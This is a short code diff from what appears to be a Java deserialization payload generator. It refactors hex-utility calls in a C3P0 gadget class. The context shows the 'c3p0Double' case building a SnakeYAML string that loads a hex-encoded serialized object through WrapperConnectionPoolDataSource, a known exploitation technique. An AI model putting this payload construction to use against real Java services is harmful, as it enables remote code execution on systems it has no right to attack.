@@ -4,7 +4,6 @@ import com.mchange.v2.c3p0.PoolBackedDataSource;
 import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
 import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
-import com.qi4l.JYso.gadgets.utils.HexUtils;
 import com.qi4l.JYso.gadgets.utils.Reflections;
 import org.apache.naming.ResourceRef;
 
@@ -97,8 +96,8 @@ public class C3P04 implements ObjectPayload<Object> {
                     break;
                 case "c3p0Double":
                     try {
-                        byte[] data = HexUtils.toByteArray(Files.newInputStream(Paths.get(cmd)));
-                        String hexString = HexUtils.bytesToHexString(data, data.length);
+                        byte[] data = com.qi4l.JYso.gadgets.utils.Utils.toByteArray(Files.newInputStream(Paths.get(cmd)));
+                        String hexString = com.qi4l.JYso.gadgets.utils.Utils.bytesToHexString(data, data.length);
                         yaml = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
                                 "userOverridesAsString: HexAsciiSerializedMap:" + hexString + ";";
                     } catch (IOException e) {
